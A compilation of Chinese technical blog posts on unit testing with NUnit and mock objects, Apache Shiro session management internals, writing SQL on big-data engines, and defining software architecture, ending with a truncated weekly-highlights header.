    自动化测试同样不是银弹，自动化测试虽然与手工测试相比有其优点，其测试效率高，资源利用率高(一般白天开发写用例，晚上自动化程序跑)，可以进行压力、负载、并发、重复等人力不可完成的测试任务，执行效率较快，执行可靠性较高，测试脚本可重复利用，bug及时发现.......但也有其不可避免的缺点，如:只适合回归测试，开发中的功能或者变更频繁的功能，由于变更频繁而不断更改测试脚本是不划算的，并且脚本的开发也需要高水平的测试人员和时间......总体来说，虽然自动化的测试可以解决一部分的问题，但也同样会带来另一些问题。到底应该不应该引入自动化的测试还需要结合自己公司的团队现状来综合考虑。
    而我们的团队从短期来看引入自动化的测试其必然会带来一些问题，但长远来看其优点还是要大于其缺陷的，因此我们决定做自动化的测试，当然这具体是不是另一个火坑还需要时间来判定！
1.2 认识自动化测试金字塔

    以上便是经典的自动化测试金字塔。
    位于金字塔顶端的是探索性测试，探索性测试并没有具体的测试方法，通常是团队成员基于对系统的理解，以及基于现有测试无法覆盖的部分，做出系统性的验证，譬如：跨浏览器的测试,一些视觉效果的测试等。探索性测试由于这类功能变更比较频繁，而且全部实现自动化成本较高，因此小范围的自动化的测试还是有效的。而且其强调测试人员的主观能动性，也不太容易通过自动化的测试来实现，更多的是手工来完成。因此其成本最高，难度最大，反馈周期也是最慢的。
    而在测试金字塔的底部是单元测试,单元测试是针对程序单元的检测，通常单元测试都能通过自动化的方式运行,单元测试的实现成本较低，运行效率较高，能够通过工具或脚本完全自动化的运行，此外，单元测试的反馈周期也是最快的，当单元测试失败后,能够很快发现，并且能够较容易的找到出错的地方并修正。重要的事单元测试一般由开发人员编写完成。(这一点很重要，因为在我这个二线小城市里，能够编写代码的测试人员实在是罕见！)
    在金字塔的中间部分，自底向上还包括接口(契约)测试，集成测试，组件测试以及端到端测试等，这些测试侧重点不同，所使用的技术方法工具等也不相同。
    总体而言，在测试金字塔中，从底部到顶部业务价值的比重逐渐增加，即越顶部的测试其业务价值越大，但其成本也越来越大，而越底部的测试其业务价值虽小，但其成本较低，反馈周期较短，效率也更高。
1.3 从单元测试开始
    我们要开始做自动化测试，但不可能一下子全都做(考虑我们的人力与技能也做不到)。因此必须有侧重点，考虑良久最终我们决定从单元测试开始。于是我在刚吃了自动化部署的螃蟹之后，不得不来吃自动化测试的第一个螃蟹。既然决定要做，那么我们就要先明白单元测试是什么？
二、单元测试是什么
2.1 什么是单元测试。
    我们先来看几个常见的对单元测试的定义。
    用最简单的话说：单元测试就是针对一个工作单元设计的测试，这里的“工作单元”是指对一个工作方法的要求。
    单元测试是开发者编写的一小段代码，用于检测被测代码的一个很小的、很明确的功能是否正确。通常而言，一个单元测试用于判断某个特定条件(或场景)下某个特定函数的行为。
例：
    你可能把一个很大的值放入一个有序list中去，然后确认该值出现在list的尾部。或者，你可能会从字符串中删除匹配某种模式的字符，然后确认字符串确实不再包含这些字符了。
执行单元测试，就是为了证明某段代码的行为和开发者所期望的一致！
2.2 什么不是单元测试
    这里我们暂且先将其分为三种情况
2.2.1 跨边界的测试
    单元测试背后的思想是，仅测试这个方法中的内容，测试失败时不希望必须穿过基层代码、数据库表或者第三方产品的文档去寻找可能的答案！
    当测试开始渗透到其他类、服务或系统时，此时测试便跨越了边界，失败时会很难找到缺陷的代码。
    测试跨边界时还会产生另一个问题，当边界是一个共享资源时，如数据库。与团队的其他开发人员共享资源时，可能会污染他们的测试结果！
2.2.2 不具有针对性的测试
    如果发现所编写的测试对一件以上的事情进行了测试，就可能违反了“单一职责原则”。从单元测试的角度来看，这意味着这些测试是难以理解的非针对性测试。随着时间的推移，向类或方法种添加了更多的不恰当的功能后，这些测试可能会变的非常脆弱。诊断问题也将变得极具有挑战性。
    如：StringUtility中计算一个特定字符在字符串中出现的次数，它没有说明这个字符在字符串中处于什么位置也没有说明除了这个字符出现多少次之外的其他任何信息，那么这些功能就应该由StringUtility类的其它方法提供！同样，StringUtility类也不应该处理数字、日期或复杂数据类型的功能！
2.2.3 不可预测的测试
    单元测试应当是可预测的。在针对一组给定的输入参数调用一个类的方法时，其结果应当总是一致的。有时，这一原则可能看起来很难遵守。例如：正在编写一个日用品交易程序，黄金的价格可能上午九时是一个值，14时就会变成另一个值。
    好的设计原则就是将不可预测的数据的功能抽象到一个可以在单元测试中模拟(Mock)的类或方法中(关于Mock请往下看)。
三、如何去做单元测试
3.1 单元测试框架
    在单元测试框架出现之前，开发人员在创建可执行测试时饱受折磨。最初的做法是在应用程序中创建一个窗口，配有"测试控制工具(harness)"。它只是一个窗口，每个测试对应一个按钮。这些测试的结果要么是一个消息框，要么是直接在窗体本身给出某种显示结果。由于每个测试都需要一个按钮，所以这些窗口很快就会变得拥挤、不可管理。
由于人们编写的大多数单元测试都有非常简单的模式：

执行一些简单的操作以建立测试。
执行测试。
验证结果。
必要时重设环境。

于是，单元测试框架应运而生(实际上就像我们的代码优化中提取公共方法形成组件)。
    单元测试框架(如NUnit)希望能够提供这些功能。单元测试框架提供了一种统一的编程模型，可以将测试定义为一些简单的类，这些类中的方法可以调用希望测试的应用程序代码。开发人员不需要编写自己的测试控制工具；单元测试框架提供了测试运行程序(runner)，只需要单击按钮就可以执行所有测试。利用单元测试框架，可以很轻松地插入、设置和分解有关测试的功能。测试失败时，测试运行程序可以提供有关失败的信息，包含任何可供利用的异常信息和堆栈跟踪。
​ .Net平台常用的单元测试框架有：MSTesting、Nunit、Xunit等。
3.2 简单示例(基于Nunit)
    /// <summary>
    /// 计算器类
    /// </summary>
    public class Calculator
    {
        /// <summary>
        /// 加法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Add(double a, double b)
        {
            return a + b;
        }

        /// <summary>
        /// 减法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Sub(double a, double b)
        {
            return a - b;
        }

        /// <summary>
        /// 乘法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Mutiply(double a, double b)
        {
            return a * b;
        }

        /// <summary>
        /// 除法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Divide(double a, double b)
        {
            return a / b;
        }
    }
    /// <summary>
    /// 针对计算加减乘除的简单的单元测试类
    /// </summary>
    [TestFixture]
    public class CalculatorTest
    {
        /// <summary>
        /// 计算器类对象
        /// </summary>
        public Calculator Calculator { get; set; }

        /// <summary>
        /// 参数1
        /// </summary>
        public double NumA { get; set; }

        /// <summary>
        /// 参数2
        /// </summary>
        public double NumB { get; set; }

        /// <summary>
        /// 初始化
        /// </summary>
        [SetUp]
        public void SetUp()
        {
            NumA = 10;
            NumB = 20;
            Calculator = new Calculator();
        }

        /// <summary>
        /// 测试加法
        /// </summary>
        [Test]
        public void TestAdd()
        {
            double result = Calculator.Add(NumA, NumB);
            Assert.AreEqual(result, 30);
        }

        /// <summary>
        /// 测试减法
        /// </summary>
        [Test]
        public void TestSub()
        {
            double result = Calculator.Sub(NumA, NumB);
            Assert.LessOrEqual(result, 0);
        }

        /// <summary>
        /// 测试乘法
        /// </summary>
        [Test]
        public void TestMutiply()
        {
            double result = Calculator.Mutiply(NumA, NumB);
            Assert.GreaterOrEqual(result, 200);
        }
        
        /// <summary>
        /// 测试除法
        /// </summary>
        [Test]
        public void TestDivide()
        {
            double result = Calculator.Divide(NumA, NumB);
            Assert.IsTrue(0.5 == result);
        }
    }
3.3 如何做好单元测试
​ 单元测试是非常有魔力的魔法，但是如果使用不恰当亦会浪费大量的时间在维护和调试上从而影响代码和整个项目。
好的单元测试应该具有以下品质:
• 自动化
• 彻底的
• 可重复的
• 独立的
• 专业的
3.3.1 测试哪些内容
​ 一般来说有六个值得测试的具体方面，可以把这六个方面统称为Right-BICEP:

Right----结果是否正确？
B----是否所有的边界条件都是正确的？
I----能否检查一下反向关联？C----能否用其它手段检查一下反向关联？
E----是否可以强制产生错误条件？
P----是否满足性能条件？

3.3.2 CORRECT边界条件
​ 代码中的许多Bug经常出现在边界条件附近，我们对于边界条件的测试该如何考虑？

一致性----值是否满足预期的格式
有序性----一组值是否满足预期的排序要求
区间性----值是否在一个合理的最大值最小值范围内
引用、耦合性----代码是否引用了一些不受代码本身直接控制的外部因素
存在性----值是否存在（例如：非Null，非零，存在于某个集合中）
基数性----是否恰好具有足够的值
时间性----所有事情是否都按照顺序发生的？是否在正确的时间、是否及时

3.3.3 使用Mock对象
    单元测试的目标是一次只验证一个方法或一个类，但是如果这个方法依赖一些其他难以操控的东西，比如网络、数据库等。这时我们就要使用mock对象，使得在运行unit test的时候使用的那些难以操控的东西实际上是我们mock的对象，而我们mock的对象则可以按照我们的意愿返回一些值用于测试。通俗来讲，Mock对象就是真实对象在我们调试期间的测试品。
Mock对象创建的步骤:

使用一个接口来描述这个对象。
为产品代码实现这个接口。
以测试为目的，在mock对象中实现这个接口。

Mock对象示例:
   /// <summary>
    ///账户操作类
    /// </summary>
    public class AccountService
    {
        /// <summary>
        /// 接口地址
        /// </summary>
        public string Url { get; set; }

        /// <summary>
        /// Http请求帮助类
        /// </summary>
        public IHttpHelper HttpHelper { get; set; }
        /// <summary>
        /// 构造函数
        /// </summary>
        /// <param name="httpHelper"></param>
        public AccountService(IHttpHelper httpHelper)
        {
            HttpHelper = httpHelper;
        }

        #region 支付
        /// <summary>
        /// 支付
        /// </summary>
        /// <param name="json">支付报文</param>
        /// <param name="tranAmt">金额</param>
        /// <returns></returns>
        public bool Pay(string json)
        {            
            var result = HttpHelper.Post(json, Url);
            if (result == "SUCCESS")//这是我们要测试的业务逻辑
            {
                return true;
            }
            return false;
        }
        #endregion

        #region 查询余额
        /// <summary>
        /// 查询余额
        /// </summary>
        /// <param name="account"></param>
        /// <returns></returns>
        public decimal? QueryAmt(string account)
        {
            var url = string.Format("{0}?account={1}", Url, account);

            var result = HttpHelper.Get(url);

            if (!string.IsNullOrEmpty(result))//这是我们要测试的业务逻辑
            {
                return decimal.Parse(result);
            }
            return null;
        }
        #endregion

    }
    /// <summary>
    /// Http请求接口
    /// </summary>
    public interface IHttpHelper
    {
        string Post(string json, string url);

        string Get(string url);
    }
    /// <summary>
    /// HttpHelper
    /// </summary>
    public class HttpHelper:IHttpHelper
    {
        public string Post(string json, string url)
        {
            //假设这是真实的Http请求
            var result = string.Empty;
            return result;
        }

        public string Get(string url)
        {
            //假设这是真实的Http请求
            var result = string.Empty;
            return result;
        }

    }
    /// <summary>
    /// Mock的 HttpHelper
    /// </summary>
    public class MockHttpHelper:IHttpHelper
    {
        public string Post(string json, string url)
        {
            //这是Mock的Http请求
            var result = "SUCCESS";
            return result;
        }

        public string Get(string url)
        {
            //这是Mock的Http请求
            var result = "0.01";
            return result;
        }

   }
     如上，我们的AccountService的业务逻辑依赖于外部对象Http请求的返回值在真实的业务中我们给AccountService注入真实的HttpHelper类，而在单元测试中我们注入自己Mock的HttpHelper，我们可以根据不同的用例来模拟不同的Http请求的返回值来测试我们的AccountService的业务逻辑。
注意:记住，我们要测试的是AccountService的业务逻辑:根据不同http的请求(或传入不同的参数)而返回不同的结果，一定要弄明白自己要测的是什么！而无关的外部对象内的逻辑我们并不关心，我们只需要让它给我们返回我们想要的值，来验证我们的业务逻辑即可
    关于Mock对象一般会使用Mock框架，关于Mock框架的使用，我们将在下一篇文章中介绍。.net 平台常用的Mock框架有Moq,PhinoMocks,FakeItEasy等。
3.4 单元测试之代码覆盖率
​ 在做单元测试时，代码覆盖率常常被拿来作为衡量测试好坏的指标，甚至，用代码覆盖率来考核测试任务完成情况，比如，代码覆盖率必须达到80％或90％。于是乎，测试人员费尽心思设计案例覆盖代码。因此我认为用代码覆盖率来衡量是不合适的，我们最根本的目的是为了提高我们回归测试的效率，项目的质量不是吗?
结束语
    本篇文章主要介绍了单元测试的WWH，分享了我们为什么要做单元测试并简单介绍了单元测试的概念以及如何去做单元测试。当然，千万不要天真的以为看了本篇文章就能做好单元测试，如果你的组织开始推进了单元测试，那么在推进的过程中相信仍然会遇到许多问题(就像我们遇到的，依赖外部对象问题，静态方法如何mock......)。如何更好的去做单元测试任重而道远。下一篇文章将针对我们具体实施推进单元测试中遇到的一些问题，来讨论如何更好的做单元测试。如:如何破除依赖，如何编写可靠可维护的测试，以及如何面向测试进行程序的设计等。
​ 未完待续，敬请关注......
参考
《单元测试的艺术》
我们做单元测试的经历

********************************************************************************************************************************************************************************************************
shiro源码篇 - shiro的session管理，你值得拥有
前言
　　开心一刻
　　　　开学了，表弟和同学因为打架，老师让他回去叫家长。表弟硬气的说：不用，我打得过他。老师板着脸对他说：和你打架的那位同学已经回去叫家长了。表弟犹豫了一会依然硬气的说：可以，两个我也打得过。老师：......
 
　　路漫漫其修远兮，吾将上下而求索！
　　github：https://github.com/youzhibing
　　码云(gitee)：https://gitee.com/youzhibing
前情回顾
　　大家还记得上篇博文讲了什么吗，我们来一起简单回顾下：
　　　　HttpServletRequestWrapper是HttpServletRequest的装饰类，我们通过继承HttpServletRequestWrapper来实现我们自定义的HttpServletRequest：CustomizeSessionHttpServletRequest，重写CustomizeSessionHttpServletRequest的getSession，将其指向我们自定义的session。然后通过Filter将CustomizeSessionHttpServletRequest添加到Filter chain中，使得到达Servlet的ServletRequest是我们的CustomizeSessionHttpServletRequest。
　　今天不讲session共享，我们先来看看shiro的session管理
SecurityManager
　　SecurityManager，安全管理器；即所有与安全相关的操作都会与SecurityManager交互；它管理着所有Subject，所有Subject都绑定到SecurityManager，与Subject的所有交互都会委托给SecurityManager；SecurityManager是shiro的核心，它负责与shiro的其他组件进行交互，类似SpringMVC中的DispatcherServlet或Struts2中的FilterDispatcher。
　　我们在使用shiro的时候，首先都会先初始化SecurityManager，然后往SecurityManager中注入shiro的其他组件，像sessionManager、realm等。我们的spring-boot-shiro中初始化的是DefaultWebSecurityManager，如下


@Bean
public SecurityManager securityManager(AuthorizingRealm myShiroRealm, CacheManager shiroRedisCacheManager) {
    DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();
    securityManager.setCacheManager(shiroRedisCacheManager);
    securityManager.setRememberMeManager(cookieRememberMeManager());
    securityManager.setRealm(myShiroRealm);
    return securityManager;
}

View Code
　　SecurityManager类图
　　　　结构如下，认真看看，注意看下属性

　　　　顶层组件SecurityManager直接继承了SessionManager且提供了SessionsSecurityManager实现，SessionsSecurityManager直接把会话管理委托给相应的SessionManager；SecurityManager的默认实现：DefaultSecurityManager及DefaultWebSecurityManager都继承了SessionsSecurityManager，也就是说：默认情况下，session的管理由DefaultSecurityManager或DefaultWebSecurityManager中的SessionManager来负责。
　　　　DefaultSecurityManager
　　　　　　默认安全管理器，用于我们的javaSE安全管理，一般而言用到的少，但我们需要记住，万一哪次有这个需求呢。
　　　　　　我们来看下他的构造方法

　　　　　　默认的sessionManager是DefaultSessionManager，DefaultSessionManager具体详情请看下文。
　　　　DefaultWebSecurityManager
　　　　　　默认web安全管理器，用于我们的web安全管理；一般而言，我们的应用中初始化此安全管理器。
　　　　　　我们来看看其构造方法



public DefaultWebSecurityManager() {
    super();                                                    // 会调用SessionsSecurityManager的构造方法，实例化DefaultSessionManager
    ((DefaultSubjectDAO) this.subjectDAO).setSessionStorageEvaluator(new DefaultWebSessionStorageEvaluator());
    this.sessionMode = HTTP_SESSION_MODE;
    setSubjectFactory(new DefaultWebSubjectFactory());
    setRememberMeManager(new CookieRememberMeManager());
    setSessionManager(new ServletContainerSessionManager());    // 设置sessionManager，替换掉上面的DefaultSessionManager
}

View Code
　　　　　　可以看出此时的sessionManager是ServletContainerSessionManager，ServletContainerSessionManager具体详情请看下文。
　　　　由此可知默认情况下，DefaultSecurityManager会将session管理委托给DefaultSessionManager，而DefaultWebSecurityManager则将session管理委托给ServletContainerSessionManager。
　　　　我们可以通过继承DefaultSecurityManager或DefaultWebSecurityManager来实现自定义SecurityManager，但一般而言没必要，DefaultSecurityManager和DefaultWebSecurityManager基本能满足我们的需要了，我们根据需求二选其一即可。无论DefaultSecurityManager还是DefaultWebSecurityManager，我们都可以通过setSessionManager方法来指定sessionManager，如果不指定sessionManager的话就用的SecurityManager默认的sessionManager。
SessionManager
　　shiro提供了完整的会话管理功能，不依赖底层容器，JavaSE应用和JavaEE应用都可以使用。会话管理器管理着应用中所有Subject的会话，包括会话的创建、维护、删除、失效、验证等工作。
　　SessionManager类图

　　　　　　DefaultSessionManager
　　　　　　DefaultSecurityManager默认使用的SessionManager，用于JavaSE环境的session管理。

　　　　　　通过上图可知（结合SecurityManager类图），session创建的关键入口是SessionsSecurityManager的start方法，此方法中会将session的创建任务委托给具体的SessionManager实现。
　　　　　　DefaultSessionManager继承自AbstractNativeSessionManager，没用重写start方法，所以此时AbstractNativeSessionManager的start方法会被调用，一路往下跟，最终会调用DefaultSessionManager的doCreateSession方法完成session的创建，doCreateSession方法大家可以自行去跟下，我在这总结一下：　　　　　　　
　　　　　　　　创建session，并生成sessionId，session是shiro的SimpleSession类型，sessionId采用的是随机的UUID字符串；	　　　　　　　　sessionDAO类型是MemorySessionDAO，session存放在sessionDAO的private ConcurrentMap<Serializable, Session> sessions;属性中，key是sessionId，value是session对象；	　　　　　　　　除了MemorySessionDAO，shiro还提供了EnterpriseCacheSessionDAO，具体两者有啥区别请看我的另一篇博客讲解。
	　　　　ServletContainerSessionManager
　　　　　　DefaultWebSecurityManager默认使用的SessionManager，用于Web环境，直接使用的Servlet容器的会话，具体实现我们往下看。
　　　　　　ServletContainerSessionManager实现了SessionManager，并重写了SessionManager的start方法，那么我们从ServletContainerSessionManager的start方法开始来看看session的创建过程，如下图

　　　　　　shiro有自己的HttpServletSession，HttpServletSession持有servlet的HttpSession的引用，最终对HttpServletSession的操作都会委托给HttpSession（装饰模式）。那么此时的session是标准servlet容器支持的HttpSession实例，它不与Shiro的任何与会话相关的组件（如SessionManager，SecurityManager等）交互，完全由servlet容器管理。
	　　　　DefaultWebSessionManager
　　　　　　用于Web环境，可以替换ServletContainerSessionManager，废弃了Servlet容器的会话管理；通过此可以实现我们自己的session管理；
　　　　　　从SessionManager类图可知，DefaultWebSessionManager继承自DefaultSessionManager，也没有重写start方法，那么创建过程还是沿用的AbstractNativeSessionManager的start方法；如果我们没有指定自己的sessionDao，那么session还是存在MemorySessionDAO的ConcurrentMap<Serializable, Session> sessions中，具体可以看上述中的DefaultSessionManager。
　　　　　　通过DefaultWebSessionManager实现session共享，尽请期待！
总结
　　两个类图
　　　　SecurityManager和SessionManager的类图需要认真看看；
　　　　Subject的所有交互都会委托给SecurityManager；SecurityManager是shiro的核心，它负责与shiro的其他组件进行交互，类似SpringMVC中的DispatcherServlet或Struts2中的FilterDispatcher；
　　　　SecurityManager会将session管理委托给SessionManager；SessionsSecurityManager的start方法中将session的创建委托给了具体的sessionManager，是创建session的关键入口。	　　shiro的SimpleSession与HttpServletSession		　　　　HttpServletSession只是servlet容器的session的装饰，最终还是依赖servlet容器，是shiro对servlet容器的session的一种支持；		　　　　而SimpleSession是shiro完完全全的自己实现，是shiro对session的一种拓展。
参考
　　《跟我学shiro》
********************************************************************************************************************************************************************************************************
大数据不就是写SQL吗?
应届生小祖参加了个需求分析会回来后跟我说被产品怼了一句：

"不就是写SQL吗，要那么久吗"

我去，欺负我小弟，这我肯定不能忍呀，于是我写了一篇文章发在了公司的wiki


贴出来给大家看看，省略了一些敏感的内容。当然内部版言辞也会温和一点，嘻嘻

在哪里写SQL？
这个问题高级点的问法是用哪种SQL引擎？
SparkSQL、Hive、Phoenix、Drill、Impala、Presto、Druid、Kylin （这里的SQL引擎是广义的，大家不必钻牛角尖）
我用一句话概括下这几个东西，先不管你们现在看不看得懂：

Hive：把sql解析后用MapReduce跑
SparkSQL：把sql解析后用Spark跑，比hive快点
Phoenix：一个绕过了MapReduce运行在HBase上的SQL框架
Drill/Impala/Presto 交互式查询,都是类似google Dremel的东西，区别这里就不说了
Druid/Kylin olap预计算系统

这就涉及到更多的问题了，对这些组件不熟悉的同学可能调研过程就得花上一个多月。
比如需求是实时计算还是离线分析？
数据是增量数据还是静态数据？
数据量有多大？
能容忍多长的响应时间？
总之，功能、性能、稳定性、运维难度、开发难度这些都是要考虑的
对哪里的数据执行SQL？
你以为选完引擎就可以开写了？too naive！
上面提到的大部分工具都仅仅是查询引擎，存储呢？
“啥，为啥还要管存储？”
不管存储，那是要把PB级的数据存在mysql是吧...
关系型数据库像mysql这种，查询引擎和存储是紧耦合的，这其实是有助于优化性能的，你不能把它们拆分开来。
而大数据系统SQL引擎一般都是独立于数据存储系统，获得了更大的灵活性。这都是出于数据量和性能的考虑。
这涉及到的问题就更多了。先要搞清楚引擎支持对接哪些存储，怎么存查询起来方便高效。
可以对接的持久化存储我截个图，感受一下（这还只是一小部分）

用哪种语法写SQL？
你以为存储和查询搞定就可以开写了？你以为全天下的sql都是一样的？并不是！
并不是所有的引擎都支持join；
并不是所有的distinct都是精准计算的；
并不是所有的引擎都支持limit分页；
还有，如果处理复杂的场景经常会需要自定义sql方法，那如何自定义呢，写代码呀。
举几个简单而常见的栗子：
见过这样的sql吗？
select `user`["user_id"] from tbl_test ;
见过这种操作吗？
insert overwrite table tbl_test select * from tbl_test  where id>0; 
卧槽，这不会锁死吗？hive里不会，但是不建议这样做。
还能这么写
from tbl_test insert overwrite table tbl_test select *   where id>0; 
怎么用更高效的方式写SQL？
好了，全都搞定了，终于可以开始愉快地写SQL了。
写SQL的过程我用小祖刚来公司时的一句话来总结：

“卧槽，这条SQL有100多行！”

事实表，维表的数据各种join反复join，这还不算完还要再join不同时间的数据，还要$#@%^$#^...
不说了，写过的人一定知道有多恶心
（此处省略100多行字）
终于写完了，千辛万苦来到这一步，满心欢喜敲下回车...
时间过去1分钟...
10分钟...
30分钟...
1小时...
2小时...
......
别等了，这样下去是不会有结果的。
老实看日志吧，看日志也是一门很大的学问。
首先你得搞清楚这个sql是怎么运行，底层是mapReduce还是spark还是解析成了其他应用的put、get等接口;
然后得搞清楚数据是怎么走的，有没有发生数据倾斜，怎么优化。
同时你还得注意资源，cpu、内存、io等
最后
产品又来需求了，现有系统还无法实现，上面四步再折腾一遍...
推荐阅读
大数据需要学什么？
zookeeper-操作与应用场景-《每日五分钟搞定大数据》
zookeeper-架构设计与角色分工-《每日五分钟搞定大数据》
zookeeper-paxos与一致性-《每日五分钟搞定大数据》
zookeeper-zab协议-《每日五分钟搞定大数据》


********************************************************************************************************************************************************************************************************
什么是软件架构
本文探讨什么是「软件架构」，并对其下个定义！
决策or组成？
如果你去google一下「什么是软件架构」，你会看到各种各样的定义！不过大致可分为「决策」论和「组成」论！
其中一个比较著名的「决策」论的定义是Booch,Rumbaugh和Jacobson于1999年提出的：

架构就是一系列重要的决策，这些决策涉及软件系统的组织、组成系统的结构化元素及其接口的选择、元素之间协作时特定的行为、结构化元素和行为元素形成更大子系统的组合方式以及引导这一组织（也就是这些元素及其接口）、他们之间的协作以及组合（架构风格）。

而「组成」论中最受推崇的是SEI(Software Engineering Institute)的Len Bass等人提出的定义：

The software architecture of a program or computing system is the structure or structures of the system,which comprise software elements,the externally visible properties of those elements,and the relationships among them.

Fielding博士在他的博士论文《Architectural Styles and the Design of Network-based Software Architectures》中对软件架构的定义是这样的：

A software architecture is an abstraction of the run-time elements of a software system during some phase of its operation. A system may be composed of many levels of abstraction and many phases of operation, each with its own software architecture.
软件架构是软件系统在其操作的某个阶段的运行时的元素的抽象。一个系统可能由很多层抽象和很多个操作阶段组成,每个抽象和操作阶段都有自己的软件架构。

这其实也是「组成论」！不过这里说的是系统运行时的快照！
为什么会出现这样的分歧呢？我觉得主要问题在每个人对「架构」这个词的理解！
我先来问你一个问题，你觉得「架构」这个词是名词还是动词？或者说「架构」是一个过程，还是一个结果？
「架构」对应英文单词「Architecture」，在英文里Architecture是个名词，表示结构。但实际上结构只是架构的产物，如何得到这个结构呢？是通过架构师的一个个决策得到的。所以，「架构」包含了过程和结果！
如果你去搜一下「架构」这个词的解释，你就会发现，在中文里，「架构」这个词有两层含义（来自百度词典）：

一是间架结构
二是构筑，建造

那么，「架构」是决策还是组成呢？
Wiki上对Architecture给出了一个比较好的定义：

Architecture is both the process and the product of planning, designing, and constructing buildings or any other structures。

翻译过来就是：

架构是规划、设计、构建的过程及最终成果

但是我觉得这个定义还不够，还缺少了一个关键内容，就是「约束」！
下个定义
我个人对架构的理解是：架构是特定约束下决策的结果，并且这是一个循环递进的过程。

这句话包含了三个关键词：特定约束、决策、结果。这三个词都是中性词。特别是第三个词，由于决策的不同，得到的结果也就不同，可能是「成果」，也可能是「后果」！下面来一个个具体解释。

特定约束

我们都学过阅读理解，老师在教阅读理解的时候，会提到一个词，叫「语境」！比如下面这个段子！

领导：你这是什么意思？
小明：没什么意思，意思意思。
领导：你这就不够意思了。
小明：小意思，小意思。
领导：你这人真有意思。
小明：其实也没有别的意思。
领导：那我就不好意思了。
小明：是我不好意思。
提问：以上“意思”分别是什么意思？

这里的「意思」在不同的语境下有不同的含义。语境就是上下文，也就是我们软件行业常说的Context！Context不同，得到的结果也就不同！
其实任何行为、言语、结论都有一个Context为前提！只是在不同的情况下我们对这个Context的叫法不同！比如：

直角三角形的两直角的平方等于斜边的平方

这句话在欧几里得几何这个Context下是成立的！但是在非欧几何这个Context下就是不成立的！在数学里，这个Context可以称为是「限定条件」！
同样的牛顿力学定律，在普通场景下是成立的！但是在量子力学下是不成立的！在物理里，这个Context可以称为「环境」！
在架构里也一样，淘宝的架构可能在其它情况下并不适用，因为Context不同！这里的Context就称为「约束」！
而且这个「约束」必须是「特定约束」，不能是「泛约束」！比如说，「我要造个房子」，这个约束就是个「泛约束」！是没办法执行的！（下节通过例子来详细说明）

决策

决策是一个过程！实际上就是选择！选择技术、结构、通信方式等内容，去符合「特定约束」！
在决策时，实际上无形中又加入了一个约束：人的约束！做决策的人的认知又约束了决策本身！比如某个架构师只知道分层架构，那么他无论在哪种Context下都只有分层架构这一个选择！

结果

是决策的最终产物：可能是运行良好、满足需求的系统。也可能是一堆文档。或者是满嘴的跑火车！
如果这个结果是五视图、组件、接口、子系统、及其之间的关系，那么这个架构就是软件架构！
如果这个结果是建筑图纸、钢筋水泥、高楼大厦，那么这个架构就是建筑架构！
如果这个结果是事业成功、家庭美满，那么这个架构就是人生架构，也叫人生规划！
举个例子
以上面「我要造个房子」为例，来详细解释「架构是特定约束下决策的结果」！
上面已经说了「我要造个房子」是个泛约束，是无法满足的！因为它有很多可能性选择，且很多选择是互斥的！例如：

房子造在哪里？城市、乡村、山顶、海边、南北极......
要造成什么样子？大平层、楼房、草房、城堡......
要使用什么材料？水泥、玻璃、木头、竹子......
......

这里实际就是需求收集阶段，需要和客户沟通，挖出具体的客户需求！
假设客户最终决定：想在海边建个房子，适合两个人住，每半年过来度假一周左右，希望能方便的看到海、还有日出，预计支出不超过XX元！这就是功能性需求！
通过上面的功能性需求，你需要挖出非功能性需求：

海边风大、潮湿。如何防风？防潮？
海潮声音大，是否需要做好隔音？避免影响睡眠？
希望能看到海和日出，使用玻璃是否合适？需要什么样的玻璃？
价格是否超出预算？
.....

完善的需求（功能性、非功能性），实际就是架构的「特定约束」！而对上面这些问题的选择，就是「决策」！

为了防风，地基要打深一点；要使用防潮材料
墙壁需要加厚，使用隔音门和窗户
面朝大海的墙使用强化加厚玻璃墙
选择价格内的材料
......

这些决策确定后，需要告诉工人如何建造！需要相关的设计图，对不同的人需要不同的图！比如，对建造工人就是整体结构说明图，水电工就是水电线路图！这些图纸就是你决策的部分结果。
整个过程是个循环递进的过程！比如：你为了解决客户方便看海的问题，先选择了开一个较大的窗户的方案！但是客户觉得不够大！你决定直接把整面墙都使用玻璃来建造，客户很满意，但是承重、防风等问题如何解决？你最终决定通过使用强化的加厚玻璃来解决这个问题！
最终交付给客户的房子才是你架构的最终成果！
免责申明：我不懂造房子，以上言论都是胡诌的，你理解意思就行了！
纵向深入
最近订阅了李运华的《从0开始学架构》，他对架构的理解是：软件架构指软件系统的顶层结构！我觉得这个定义太过宽泛了，且只是定义了「结构」而没有说明「过程」！不过，这间接说明了架构和设计的关系！架构是顶层设计！
从操作层面做决策：用户从哪里进入、页面应该跳转到哪里、应该输入哪些信息.....这就是流程设计！
从代码层面决策，代码该怎么写：模块如何组织、包如何组织、类如何组织、方法如何组织......这就是代码设计！
从系统整体层面决策：子系统如何组织、组件如何组织、接口如何设计......这就是架构设计！
横向扩展
好像架构思维是个比较通用的思维方式！读书，演讲，写作.....都是这样！
读书，你需要先了解这本书是讲关于什么的？计算机、哲学、心理学.....以及具体是讲的哪个方面？这是约束！然后你需要问自己，自己是否需要了解这些内容？是否需要读这本书？这就是决策！如果需要读，那么再进一步，这本书的整体结构是什么样子的？我该怎么读？这个章节是讲什么的？我是否需要读？我是否同意作者的结论？如果同意，我为什么同意？如果不同意，我为什么不同意？我有什么自己的观点？最终的成果就是我对这本书的个人理解！
演讲，你需要先了解你是对谁进行演讲的？要讲什么？听众的水平如何？听众的水平以及演讲的内容就是你演讲的约束！然后你需要考虑如何进行演讲？演讲的整体结构该怎么组织？该用什么样的语言？是否该讲个笑话？各个小节里的内功如何组织？这里是否需要设置问题？这里是否可能会有人提出问题？会提出什么样的问题？我该如何回答？这些是决策！最终，做出来的演讲，就是我这次演讲的成果！
写作和演讲比较类似，少了一些互动。就不再赘述了！
做个小结
本文梳理了我对架构的理解：架构是特定约束下决策的结果，并且这是一个循环递进的过程。并通过例子来解释我为什么这么理解！
参考资料

《IBM架构思维介绍》
《恰如其分的软件架构》
《Java应用架构设计》
《软件架构设计》
《程序员必读之软件架构》
维基百科
百度词典


********************************************************************************************************************************************************************************************************
上周热点回顾（10.1-10.7）
热点随笔：
